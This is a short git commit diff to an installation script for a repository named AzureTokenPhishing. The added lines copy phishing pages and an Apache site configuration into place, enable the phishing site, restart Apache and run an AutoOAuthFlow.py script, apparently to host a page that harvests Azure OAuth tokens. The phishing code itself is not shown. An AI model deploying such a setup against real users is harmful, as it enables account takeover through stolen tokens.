7cf6f49c3125d9217b6f7b6e1e2af46f791d9a72
Rafay Ahmed <ahmedrafay888@gmail.com>
2024-01-19 23:36:47 +0300

    modified installation script

--- installation.sh
+++ installation.sh
@@ -2,4 +2,11 @@ sudo apt update && sudo apt-get install apache2 python3-pip
 pip3 install requests watchdog
 git clone https://github.com/rafayahmed317/AzureTokenPhishing.git
 cd AzureTokenPhishing
-
+cp ./html /var/www/
+cp ./phishing /var/www/
+cp ./000-default.conf /etc/apache2/sites-available
+cp ./001-phishing.conf /etc/apache2/sites-available
+a2ensite 000-default
+a2ensite 001-phishing
+sudo systemctl restart apache2
+python3 /var/www/html/AutoOAuthFlow.py
